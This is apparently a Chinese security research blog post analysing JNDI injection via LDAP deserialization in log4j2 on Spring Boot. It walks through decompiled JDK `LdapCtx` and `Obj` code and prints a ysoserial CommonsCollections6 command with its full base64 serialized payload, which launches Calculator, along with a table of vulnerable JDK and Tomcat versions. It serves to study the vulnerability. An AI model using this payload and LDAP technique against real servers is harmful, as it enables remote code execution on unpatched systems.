# 0x00 前言

​
由于想要JNDI注入使用RMI协议其实存在一定的限制条件比如高版本设置了`trustURLCodebase`，虽然可以通过`BeanFactory`来加载EL表达式的方式来RCE，但是其实Tomcat在高版本也存在了限制，这种方式也就无法利用了，于是想到其实还存在LDAP反序列化的漏洞，可以尝试利用一下。

​ 这里我选择了`JDK8u111 & Springboot2.5.13`版本来首先测试一下简单的JNDI注入的RCE的利用链。

# 0x01 JNDI注入

这里就是基础的log4j2 RCE的基础利用链了，可以看到熟悉的`JndiManager.lookup()`

![](./img/8227061245260754707.png)

这里是直接加载了RCE的恶意类，所以我们可以看到程序栈中是

`ComponentContext#p_lookup`\-->`LdapCtx#c_lookup`\-->`DirectoryManager#getObjectInstance`

这不是反序列化的利用链其实。

# 0x02 LDAP反序列化

其实在`LdapCtx#c_lookup`中存在`Obj.decodeObject()`方法，这里是反序列化的入口

    
    
    protected Object c_lookup(Name var1, Continuation var2) throws NamingException {
            var2.setError(this, var1);
            Object var3 = null;
    
            Object var4;
            try {
                SearchControls var22 = new SearchControls();
                var22.setSearchScope(0);
                var22.setReturningAttributes((String[])null);
                var22.setReturningObjFlag(true);
                LdapResult var23 = this.doSearchOnce(var1, "(objectClass=*)", var22, true);
                this.respCtls = var23.resControls;
                if (var23.status != 0) {
                    this.processReturnCode(var23, var1);
                }
    
                if (var23.entries != null && var23.entries.size() == 1) {
                    LdapEntry var25 = (LdapEntry)var23.entries.elementAt(0);
                    var4 = var25.attributes;
                    Vector var8 = var25.respCtls;
                    if (var8 != null) {
                        appendVector(this.respCtls, var8);
                    }
                } else {
                    var4 = new BasicAttributes(true);
                }
    
                if (((Attributes)var4).get(Obj.JAVA_ATTRIBUTES[2]) != null) {
                  //这里是反序列化的入口
                    var3 = Obj.decodeObject((Attributes)var4);
                }
    
                if (var3 == null) {
                    var3 = new LdapCtx(this, this.fullyQualifiedName(var1));
                }
            } catch (LdapReferralException var20) {
                LdapReferralException var5 = var20;
                if (this.handleReferrals == 2) {
                    throw var2.fillInException(var20);
                }
    
                while(true) {
                    LdapReferralContext var6 = (LdapReferralContext)var5.getReferralContext(this.envprops, this.bindCtls);
    
                    try {
                        Object var7 = var6.lookup(var1);
                        return var7;
                    } catch (LdapReferralException var18) {
                        var5 = var18;
                    } finally {
                        var6.close();
                    }
                }
            } catch (NamingException var21) {
                throw var2.fillInException(var21);
            }
    
            try {
                return DirectoryManager.getObjectInstance(var3, var1, this, this.envprops, (Attributes)var4);
            } catch (NamingException var16) {
                throw var2.fillInException(var16);
            } catch (Exception var17) {
                NamingException var24 = new NamingException("problem generating object using object factory");
                var24.setRootCause(var17);
                throw var2.fillInException(var24);
            }
        }
    

`decodeObject`中的代码如下

    
    
    static Object decodeObject(Attributes var0) throws NamingException {
          String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[4]));
    
          try {
              Attribute var1;
              if ((var1 = var0.get(JAVA_ATTRIBUTES[1])) != null) {
                  ClassLoader var3 = helper.getURLClassLoader(var2);
                //如果想要触发反序列化就要进入到这个if判断中
                  return deserializeObject((byte[])((byte[])var1.get()), var3);
              } else if ((var1 = var0.get(JAVA_ATTRIBUTES[7])) != null) {
                  return decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[2]).get(), (String)var1.get(), var2);
              } else {
                  var1 = var0.get(JAVA_ATTRIBUTES[0]);
                  return var1 == null || !var1.contains(JAVA_OBJECT_CLASSES[2]) && !var1.contains(JAVA_OBJECT_CLASSES_LOWER[2]) ? null : decodeReference(var0, var2);
              }
          } catch (IOException var5) {
              NamingException var4 = new NamingException();
              var4.setRootCause(var5);
              throw var4;
          }
      }
    

如图所示，`var0`就是我们的入参其中是`objectclass`等等内容

![](./img/5417005605397272997.png)

然后想要从`var0`中获取`JAVA_ATTRIBUTES[1]`，该属性的内容就是`javaSerializedData`

![](./img/8111647619044523410.png)

但是这样明显可以看出我们的`var0`中并没有该属性（因为这里是直接加在恶意类，并不是获取一个序列化之后的恶意类），所以一定是无法进入这个if判断的。于是我们就要新建一个LDAP服务来提供一个序列化之后的恶意类。只是反序列化漏洞需要的环境是本次存在对应的依赖。

​ 首先要搭建一个LDAP的恶意服务端，服务端返回的是恶意的Java序列化之后的数据，这里我选择使用CC6的利用链，先生成一下

    
    
    $ > java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 'open -a Calculator' |base64 
    
    rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ABJvcGVuIC1hIENhbGN1bGF0b3J0AARleGVjdXEAfgAbAAAAAXEAfgAgc3EAfgAPc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4eA==
    

搭建服务端的话这里参考了大佬的[项目](https://github.com/l3yx/JNDI-Injection-LDAP-Deserialization)

![](./img/2237424621464342821.png)

首先看一下效果肯定是可以直接RCE的。

![](./img/4205830813267953543.png)

版本测试

JDK版本 | SpingBoot版本 | Tomcat版本 | RCE  
---|---|---|---  
JDK8u111 | 2.5.13 | Apache Tomcat/9.0.62] | ✅  
JDK8u361 | 2.5.13 | Apache Tomcat/9.0.62] | ✅  
JDK8u361 | 2.7.14 | Apache Tomcat/9.0.78 | ✅  
  
很好，其实只要本地存在依赖的话就是全版本的RCE了。下面来分析一下反序列化的利用原因

首先还是到`decodeObject()`函数的时候，这里一定是可以进入这个if判断了

![](./img/3872502986261341475.png)

之后我们跟进`deserializeObject()`方法中，代码如下

    
    
    private static Object deserializeObject(byte[] var0, ClassLoader var1) throws NamingException {
            try {
              //var0中就是传入的Java序列化对象中javaSerializedData对应的value，其实也就是字节码
              //var1根据我的调试是TomcatEmbeddedWebappClassLoader
                ByteArrayInputStream var2 = new ByteArrayInputStream(var0);
    
                try {
                    Object var20 = var1 == null ? new ObjectInputStream(var2) : new LoaderInputStream(var2, var1);
                  //这里就将var20给声明了
                    Throwable var21 = null;
    
                    Object var5;
                    try {
                        var5 = ((ObjectInputStream)var20).readObject();
                    } catch (Throwable var16) {
                        var21 = var16;
                        throw var16;
                    } finally {
                        if (var20 != null) {
                            if (var21 != null) {
                                try {
                                    ((ObjectInputStream)var20).close();
                                } catch (Throwable var15) {
                                    var21.addSuppressed(var15);
                                }
                            } else {
                                ((ObjectInputStream)var20).close();
                            }
                        }
    
                    }
    
                    return var5;
                } /*
    
                code*/
        }
    

入口函数就是`deserializeObject()`，其实再往后分析会变成CC6的分析。 后续再继续更新CC6的内容吧。

